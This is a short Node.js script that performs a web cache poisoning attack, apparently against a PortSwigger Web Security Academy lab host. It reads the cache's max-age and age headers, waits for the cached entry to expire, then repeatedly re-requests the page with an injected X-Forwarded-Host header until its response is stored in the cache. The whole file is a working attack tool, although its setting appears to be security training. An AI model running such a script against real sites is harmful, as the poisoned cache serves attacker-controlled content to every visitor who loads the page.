/**
 * Requests the page when the max-age expired.
 */

const fetch = require('node-fetch');


async function callback(url, headers) {
  /** @type { Response } */
  const result = await fetch(url, { headers });
  const { headers: resultHeaders } = result;

  if (resultHeaders.get('x-cache') === 'miss' && +resultHeaders.get('age') === 0) {
    console.log('[ 👌 ] cached!');
  } else {
    console.log('[ 😱 ] missed, retrying...');
    callback(url, headers)
  }
}


(async function getData(url, callback, poisonedHeader) {
  /** @type {Response} */
  const result = await fetch(url);
  const { headers } = result;
  const maxAge = +headers.get('cache-control').split('=')[1];
  const currentAge = +headers.get('age');

  setTimeout(
    callback.bind(null, url, poisonedHeader),
    (maxAge - currentAge) * 1000
  );
  console.log(`[ ⏲️  ] poisoning after ${maxAge - currentAge} seconds...`);
})(
  'https://ac8b1fd31fc72a1a80740fec00ee0090.web-security-academy.net/',
  callback,
  {
    'X-Forwarded-Host': 'example.com'
  }
);

console.log('[ 🔎 ] fetching...');
